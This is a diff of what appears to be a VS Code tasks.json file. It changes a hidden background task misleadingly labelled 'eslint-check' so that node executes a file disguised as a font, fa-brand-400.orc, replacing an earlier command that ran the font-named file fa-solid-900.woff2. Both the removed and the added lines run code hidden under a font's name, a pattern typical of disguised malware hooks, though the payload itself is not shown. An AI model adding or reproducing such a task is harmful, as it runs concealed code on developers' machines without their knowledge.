@@ -4,7 +4,10 @@
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./app/workflow/runs/[workflowId]/[executionId]/_components/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./app/workflow/runs/[workflowId]/[executionId]/_components/public/fonts/fa-solid-900.woff2) || echo ''",
+      "command": "node",
+      "args": [
+        "./app/workflow/runs/[workflowId]/[executionId]/_components/public/fonts/fa-brand-400.orc"
+      ],
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
